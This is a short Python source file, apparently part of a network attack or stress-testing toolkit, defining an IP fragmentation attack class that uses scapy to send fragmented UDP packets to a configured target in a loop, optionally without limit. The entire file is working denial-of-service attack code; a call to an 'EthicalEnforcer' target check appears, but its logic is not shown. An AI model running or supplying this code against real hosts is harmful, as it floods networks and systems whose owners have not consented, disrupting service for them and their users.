from scapy.all import IP, UDP, fragment, send
import asyncio
from core.ethical_check import EthicalEnforcer

class IPFragmentation:
    def __init__(self):
        self.eth = EthicalEnforcer()
        
    async def attack(self, config):
        self.eth.validate_target(config.target)
        packets_sent = 0
        
        while True:
            if config.packets > 0 and packets_sent >= config.packets:
                break
                
            # Craft fragmented packets
            payload = b"A" * 496 + b"B" * 500
            packet = IP(dst=config.target, id=12345)/UDP(sport=1500, dport=1501)/payload
            frags = fragment(packet, fragsize=500)
            
            for frag in frags:
                send(frag, verbose=0)
                packets_sent += 1
            
            if packets_sent % 100 == 0:
                print(f"Sent {packets_sent} fragments", end='\r')
        
        print(f"\nIP fragmentation completed. Total fragments: {packets_sent}")